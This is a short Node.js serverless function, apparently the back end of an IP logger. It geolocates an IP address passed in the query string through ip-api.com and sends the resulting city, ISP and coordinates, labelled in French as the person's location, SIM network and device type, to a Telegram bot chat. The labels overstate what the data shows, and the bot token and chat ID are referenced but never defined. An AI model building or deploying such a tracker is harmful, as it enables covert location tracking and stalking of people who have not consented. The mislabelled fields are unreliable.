const fetch = require('node-fetch');

exports.handler = async function (event, context) {
    const { ip } = event.queryStringParameters;

    if (!ip) {
        return {
            statusCode: 400,
            body: JSON.stringify({ error: 'IP address is required' }),
        };
    }

    try {
        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const locationData = await response.json();

        if (locationData.status !== 'success') {
            return {
                statusCode: 400,
                body: JSON.stringify({ error: 'Unable to geolocate the IP address' }),
            };
        }

        const message = `
            Localisation: ${locationData.city}, ${locationData.regionName}, ${locationData.country}
            Réseau/Carte SIM: ${locationData.isp}
            Type d'appareil: ${locationData.as}
            Coordonnées: ${locationData.lat}, ${locationData.lon}
        `;

        const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
        const telegramData = {
            chat_id: chatId,
            text: message
        };

        const telegramResponse = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(telegramData)
        });

        const telegramResult = await telegramResponse.json();
        if (telegramResult.ok) {
            return {
                statusCode: 200,
                body: JSON.stringify({ success: true, message: 'Location information sent successfully' }),
            };
        } else {
            return {
                statusCode: 500,
                body: JSON.stringify({ error: 'Failed to send location information' }),
            };
        }
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Internal Server Error' }),
        };
    }
};